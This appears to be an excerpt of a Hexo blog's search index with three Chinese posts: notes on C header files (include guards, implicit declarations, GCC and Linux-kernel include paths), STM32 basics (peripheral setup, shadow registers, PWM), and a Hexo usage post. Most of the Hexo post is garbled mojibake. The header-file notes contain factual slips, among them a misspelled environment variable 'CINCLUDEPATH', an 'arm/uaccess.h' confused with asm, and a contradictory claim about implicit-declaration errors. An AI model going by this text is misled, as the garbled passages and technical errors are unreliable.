    <content type="html"><![CDATA[<p>《嵌入式C语言自我修养》9.4节的读书笔记。这篇博客将会对工程项目中的头文件问题进行分析</p><span id="more"></span><h2 id="为什么需要头文件"><a href="#为什么需要头文件" class="headerlink" title="为什么需要头文件"></a>为什么需要头文件</h2><blockquote><p>主要对一个模块封装的API函数进行声明，其他模块要想调用这个接口函数，要首先包含该模块对应的头文件，然后就可以直接使用了。   </p></blockquote><p>我们在头文件中主要包含了模块函数的声明，在对应的<code>.c</code>文件中进行定义。</p><h3 id="为什么需要先声明后定义"><a href="#为什么需要先声明后定义" class="headerlink" title="为什么需要先声明后定义"></a>为什么需要先声明后定义</h3><p>这实际上是一个C语言的历史文件。计算机发展早期，内存很少，编译器在编译工程文件的时候无法同时将所有的文件全部加载到内存中一次性编译，只好以<strong>源文件为单位</strong>逐个进行编译。</p><p>一般来讲，变量的定义要放到C文件中，不要放到头文件中，因为这个头文件可能被多人使用，被多个文件包含，头文件经过预处理器多次展开之后也就变成了多次定义。除了函数声明，一般我们还可以放其他一些声明，如数据类型的定义、宏定义等。</p><p>那么我们如何防止头文件的多次包含导致的<strong>重定义</strong>错误？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _TEST_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _TEST_H</span><br>.....<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="隐式声明"><a href="#隐式声明" class="headerlink" title="隐式声明"></a>隐式声明</h2><p>需要注意的是，对于函数的隐式声明，<code>ANSI C/C99</code>标准只是给出一个<strong>warning</strong>，用来提醒程序员，这个隐式声明可能会给程序的运行带来问题。现在最新的<code>C11</code>标准和<code>C++</code>标准对隐式声明管理得更严格，遇到这种情况，直接报错处理，防患于未然。</p><p>在使用一个没有经过声明的对象\函数时，编译器不会直接报错（C89和C99）中。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mian</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span>** argv)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的<code>printf</code>函数的使用中，编译器会报错因为你没有包含<code>stdio.h</code>头文件。</p><h2 id="头文件的路径问题"><a href="#头文件的路径问题" class="headerlink" title="头文件的路径问题"></a>头文件的路径问题</h2><p>我们知道C语言的头文件包含有两种语法：   </p><ul><li><code>include &lt;stdio.h&gt;</code></li><li><code>include &quot;mytest.h&quot;</code></li></ul><p>那么这两种语法的区别是什么？</p><p>如果你引用的头文件是标准库的头文件或官方路径下的头文件，一般使用尖括号&lt;&gt;包含；如果你使用的头文件是自定义的或项目中的头文件，一般使用双引号””包含。头文件路径一般分为绝对路径和相对路径：绝对路径以根目录“&#x2F;”或者Windows下的每个盘符为路径起点，相对路径则以程序文件当前的目录为起点。</p><p>编译器在编译过程中会按照这些路径信息到指定的位置查找头文件，然后通过预处理器做展开处理。在查找头文件的过程中，编译器会按照默认的搜索顺序到不同的路径下去搜索。</p><p>以<code>＃include&lt;xx.h&gt;</code>  为例，当我们使用尖括号&lt;&gt;包含一个头文件时，头文件的搜索顺序如下。</p><p>● 通过GCC参数gcc-I指定的目录（注：大写的I）。</p><p>● 通过环境变量CINCLUDEPATH指定的目录。</p><p>● GCC的内定目录。</p><p>● 搜索规则：当不同目录下存在相同的头文件时，先搜到哪个就使用哪个，搜索到头文件后不再往下搜索。</p><p><code>include &quot;test.h&quot;</code>方式的搜索规则：</p><p>● 项目文件夹下 </p><p>● 通过GCC参数gcc-I指定的目录（注：大写的I）。</p><p>● 通过环境变量CINCLUDEPATH指定的目录。</p><p>● GCC的内定目录。</p><p>● 搜索规则：当不同目录下存在相同的头文件时，先搜到哪个就使用哪个，搜索到头文件后不再往下搜索。</p><p>在程序编译时，如果我们的头文件没有放到官方路径下面，那么我们可以通过gcc-I来指定头文件路径，编译器在编译程序时，就会到用户指定的路径目录下面去搜索该头文件。如果你不想通过这种方式，也可以通过设置环境变量来添加头文件的搜索路径。在Linux环境下我们经常使用的环境变量如下。</p><p>● PATH：可执行程序的搜索路径。</p><p>● C_INCLUDE_PATH：C语言头文件搜索路径。</p><p>● CPLUS_INCLUDE_PATH：C++头文件搜索路径。</p><p>● LIBRARY_PATH：库搜索路径。</p><p>如何设置环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加如下内容</span><br>export PATH=&quot;/path/:$PATH&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">或者是</span><br>export C_INCLUDE_PATH=&quot;/path/&quot;<br></code></pre></td></tr></table></figure><h2 id="Linux内核源码中的头文件包含"><a href="#Linux内核源码中的头文件包含" class="headerlink" title="Linux内核源码中的头文件包含"></a>Linux内核源码中的头文件包含</h2><p>如果你看过Linux内核源码，你一定看到过下面的头文件包含：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arm/uaccess.h&gt;</span></span><br></code></pre></td></tr></table></figure><p>那么上面这种形式的包含是什么情况？</p><p>打开源码顶层的<code>Makefile</code>文件可以查找到<code>LINUXINCLUDE</code>变量，用来指定内核编译时的头文件路径。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Makefile">USERINCLUDE    := \<br>-I<span class="hljs-variable">$(srctree)</span>/arch/<span class="hljs-variable">$(SRCARCH)</span>/<span class="hljs-keyword">include</span>/uapi \<br>-I<span class="hljs-variable">$(objtree)</span>/arch/<span class="hljs-variable">$(SRCARCH)</span>/<span class="hljs-keyword">include</span>/generated/uapi \<br>-I<span class="hljs-variable">$(srctree)</span>/<span class="hljs-keyword">include</span>/uapi \<br>-I<span class="hljs-variable">$(objtree)</span>/<span class="hljs-keyword">include</span>/generated/uapi \<br>                <span class="hljs-keyword">-include</span> <span class="hljs-variable">$(srctree)</span>/<span class="hljs-keyword">include</span>/linux/kconfig.h<br></code></pre></td></tr></table></figure><p>编译器通过<code>-Iinclude</code>参数指定相对路径的起点后，再指定要包含的头文件路径目录就可以了：<code>＃include &lt;linux/kernel.h&gt;</code>，预处理器就会到<code>include/linux</code>目录下查找相应的头文件<code>kernel.h</code>。</p><p>如果arch指定为x86-64，那么<code>-I$(objtree)/arch/$(SRCARCH)/include/</code>就会变成<code>-I$(objtree)/arch/x86-64/include/</code>，在给目录下有<code>arm</code>文件夹。</p><p>所以<code>#include &lt;asm/uaccess.h&gt;</code>会到指定的文件夹去寻找文件。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>《嵌入式C语言自我修养》9.4</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32</title>
    <link href="/2023/10/29/stm32/"/>
    <url>/2023/10/29/stm32/</url>
    
    <content type="html"><![CDATA[<p>stm32中的小常识</p><span id="more"></span> <h1 id="最小系统板"><a href="#最小系统板" class="headerlink" title="最小系统板"></a>最小系统板</h1><p><strong>最小系统板由：电源、存储、芯片、时钟组成</strong></p><p>绘制一个最小系统板一般需要包含如下模块：</p><ol><li>5-&gt;3.3v降压电路</li><li>复位电路</li><li>自动下载电路</li><li>usb转串口</li><li>tf卡</li><li>type-c电路</li><li>led灯</li></ol><h1 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h1><ol><li>一般在stm32中，除开系统外设即位于内核里面的外设是不需要开启时钟的如（NVIC），其他的，什么片上外设都是需要开启时钟的。</li><li>使用一个stm32片上外设的基本步骤：<ol><li>使用RCC函数开时钟</li><li>定义结构体，开始配置</li><li>使用Init函数完成初始化</li><li>使用cmd函数打开这个外设</li></ol></li><li>常见的波特率为4800、9600、115200等。</li><li>1Mhz ~ 1us<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312182106254.png"></li></ol><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p><a href="https://shequ.stmicroelectronics.cn/thread-628996-1-1.html">STM32硬件开发指南</a></p><p><a href="https://www.cnblogs.com/shangdawei/p/3255414.html">TF卡引脚定义</a></p><blockquote><p>shell引脚作用是固定</p></blockquote><p><a href="https://www.usbzh.com/article/detail-722.html">TYPE-C引脚定义</a></p><h1 id="如何学习一个外设"><a href="#如何学习一个外设" class="headerlink" title="如何学习一个外设"></a>如何学习一个外设</h1><ol><li>其的功能</li><li>有哪些引脚，以及引脚的作用</li><li>配置结构体中参数的含义</li></ol><h1 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h1><ol><li>关于预分频、分频、倍频</li></ol><ul><li>预分频：预分频是指在输入信号到达某个模块之前对信号进行分频。预分频可以用于降低信号频率，以适应模块的工作频率范围。预分频通常用于时钟信号的处理，以便将高频率的时钟信号转换为模块所需的低频信号。</li><li>分频：将输出的频率下降</li><li>倍频：将输出的频率上升</li></ul><p>其实分频器就是一个计数器，需要分n的频，就需要来n次脉冲，然后再发送一次脉冲。</p><ol start="2"><li><p>影子寄存器：在stm32中有一种寄存器称之为影子，这表示在物理上这个寄存器对应2个寄存器：一个是我们可以写入或读出的寄存器，称为预装载寄存器，另一个是我们看不见的、无法真正对其读写操作的，但在使用中真正起作用的寄存器，称为影子寄存器.<br>数据手册介绍预装载寄存器的内容可以随时传送到影子寄存器，即<strong>两者是连通的</strong>(permanently)，或者在每一次更新事件(UEV)时才把预装载寄存器的内容传送到影子寄存器。<br><br>设计预装载寄存器和影子寄存器的好处是，所有真正需要起作用的寄存器(影子寄存器)可以在同一个时间(发生更新事件时)被更新为所对应的预装载寄存器的内容，这样可以保证多个通道的操作能够准确地同步。如果没有影子寄存器，软件更新预装载寄存器时，则同时更新了真正操作的寄存器，因为软件不可能在一个相同的时刻同时更新多个寄存器，结果造成多个通道的时序不能同步，如果再加上例如中断等其它因素，多个通道的时序关系有可能会混乱，造成是不可预知的结果。</p></li><li><p>关于PWM，PWM的全称是脉冲宽度调制。PWM只可以应用于具有惯性的系统中，实际上就是不会瞬间跳变的系统。比如说：电机调速（电机断电之后不会马上停止）、LED呼吸灯（LED灯具有余晖，并且只要速度够快人眼根本看不出来是否开关）</p><p><strong>所以<code>PWM</code>实际上就是一个快字</strong></p><p>几个重要的<code>PWM</code>参数：</p><ul><li>频率，一个高电平（也可以是低电平）到下一次高电平（或者是低电平）之间的周期的倒数</li><li>占空比，高电平所用的时间在一个周期中的时间比例</li><li>分辨率，就是占空比的变化步距，每次占空比可以变化多少。如占空比以：10% 10.1% 10.2%的样子来变化则分辨率是0.1</li></ul></li><li><p>在stm32中如果自己操作寄存器的话:</p><ul><li>设置位(一般为设置为1)使用 <code>|=</code></li><li>清除位(一般为设置为0)使用 <code>&amp;=</code></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo娴ｈ法鏁ょ拠顓熺《</title>
    <link href="/2023/10/27/hexo%E4%BD%BF%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
    <url>/2023/10/27/hexo%E4%BD%BF%E7%94%A8%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>hexo閸╃儤婀版担璺ㄦ暏</p><span id="more"></span><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>瀵偓婢跺娈戦崣姗€鍣洪崥顐＄疅閿涳拷  </p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs txt">title: stm32  <br>date: 2023-10-29 17:59:15  <br>index_img: https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/%E5%BD%92%E6%A1%A3.jpg  <br><br>閸︺劌顦婚棃銏㈡箙閺傚洨鐝烽弰鍓с仛閻ㄥ嫬娴橀悧锟�<br><br>banner_img: https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/%E5%88%86%E7%B1%BB.jpg   <br><br>閹垫挸绱戦弬鍥︽閺勫墽銇氶惃鍕瘜閸ュ墽澧�<br><br>tags:      閺嶅洨顒�<br>    - 閸樼喎鍨�   <br>categories:   閸掑棛琚惄顔肩秿<br>  - STM32   <br>  - 濞村鐦�   鏉╂瑤閲滅悰銊︽閺勭柇TM32閻╊喖缍嶆稉瀣畱濞村鐦惄顔肩秿<br>keyword:    <br>  - STM32   <br>sticky:    閺傚洨鐝烽崷銊х秹缁旀瑤鑵戦惃鍕喘閸忓牏楠�,100閺堚偓妤傦拷<br>  - 100   <br>瑜版挻鏋冪粩鐘侯啎缂冾喕绨� sticky 閸氬函绱濇稉濠氼暯娴兼岸绮拋銈呮躬妫ｆ牠銆夐弬鍥╃彿閺嶅洭顣介崜宥咁杻閸旂姳绔存稉顏勬禈閺嶅浄绱濋弶銉︾垼鐠囧棜绻栭弰顖欑娑擃亞鐤嗘い鑸垫瀮缁旂媴绱濇担鐘插讲娴犮儵鈧俺绻冩稉濠氼暯闁板秶鐤嗛崢璇插彠闂傤厽鍨ㄦ穱顔芥暭鏉╂瑤閲滈崝鐔诲厴閿涳拷<br><br>index:<br>  post_sticky:<br>    enable: true<br>    icon: &#x27;iconfont icon-top&#x27;<br>    <br>hide: true  闂呮劘妫岄弬鍥╃彿娑撳秴婀＃鏍€夐崪灞藉従娴犳牕缍婂锝呭瀻缁銆夐柌灞界潔缁€锟�<br><br>archive: true 婵″倹鐏夐崣顏呮Ц閹疇顔€閺傚洨鐝烽崷銊╊浕妞ょ敻娈ｉ挊蹇ョ礉娴ｅ棔绮涢棁鈧憰浣告躬瑜版帗銆傞崚鍡欒妞ょ敻鍣风仦鏇犮仛    <br></code></pre></td></tr></table></figure><h3 id="娓氳法顒�"><a href="#娓氳法顒�" class="headerlink" title="娓氳法顒�"></a>娓氳法顒�</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs txt">閸︼拷 markdown 娑擃厼濮為崗銉ヮ洤娑撳娈戞禒锝囩垳閺夈儰濞囬悽銊ょ┒缁涙拝绱�<br><br>&#123;% note success %&#125;<br>閺傚洤鐡� 閹存牞鈧拷 `markdown` 閸у洤褰�<br>&#123;% endnote %&#125;<br><br>閹存牞鈧懍濞囬悽锟� HTML 瑜般垹绱￠敍锟�<br>&lt;p class=&quot;note note-primary&quot;&gt;閺嶅洨顒�&lt;/p&gt;<br>閸欘垶鈧绌剁粵鎾呯窗<br><br>primary<br><br>secondary<br><br>success<br><br>danger<br><br>warning<br><br>info<br><br>light<br></code></pre></td></tr></table></figure><blockquote><p>WARNING娴ｈ法鏁ら弮锟� <div class="note note-primary">            <p>閸滐拷 </p>          </div> 闂団偓閸楁洜瀚稉鈧悰宀嬬礉閸氾箑鍨导姘毉閻滀即妫舵０锟�</p></blockquote><h3 id="閹舵e褰旈崸锟�"><a href="#閹舵e褰旈崸锟�" class="headerlink" title="閹舵ê褰旈崸锟�"></a>閹舵ê褰旈崸锟�</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">娴ｈ法鏁ら幎妯哄綌閸ф绱濋崣顖欎簰閹舵ê褰旀禒锝囩垳閵嗕礁娴橀悧鍥モ偓浣规瀮鐎涙鐡戞禒璁崇秿閸愬懎顔愰敍灞肩稑閸欘垯浜掗崷锟� markdown 娑擃厽瀵滄俊鍌欑瑓閺嶇厧绱￠敍锟�<br><br>&#123;% fold info @title %&#125;<br>闂団偓鐟曚焦濮岄崣鐘垫畱娑撯偓濞堥潧鍞寸€圭櫢绱濋弨顖涘瘮 markdown<br>&#123;% endfold %&#125;<br>info: 閸滃矁顢戦崘鍛垼缁涘墽琚导鑲╂畱閸欘垶鈧寮弫锟� title: 閹舵ê褰旈崸妞剧瑐閻ㄥ嫭鐖ｆ０锟�<br></code></pre></td></tr></table></figure><h3 id="hexo-fluid鐎规ɑ鏌熼幍瀣斀"><a href="#hexo-fluid鐎规ɑ鏌熼幍瀣斀" class="headerlink" title="hexo fluid鐎规ɑ鏌熼幍瀣斀"></a>hexo fluid鐎规ɑ鏌熼幍瀣斀</h3><p><a href="https://fluid-dev.github.io/hexo-fluid-docs/guide/#tag-%E6%8F%92%E4%BB%B6">https://fluid-dev.github.io/hexo-fluid-docs/guide/#tag-%E6%8F%92%E4%BB%B6</a></p><h1 id="閸戞椽鏁�"><a href="#閸戞椽鏁�" class="headerlink" title="閸戞椽鏁�"></a>閸戞椽鏁�</h1><p>闂団偓鐟曚胶澹掗崚顐ｆ暈閹板繒娈戦弰顖涚槨娑撯偓娑擄拷.md閺傚洣娆㈤惃鍕付瀵偓婵绻€妞ゆ槒顩﹀锝団€樼拠绋款洤<br>tag:<br>categories:<br>缁涘鐡戦敍灞肩瑝閻掓儼顕氶弬鍥︽娑撳秳绱扮悮顐＄瑐娴肩姴鍩実ithub娑擄拷</p><p>表格|1|2|3|<br>-|-|-|<br>sdf|adf|</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
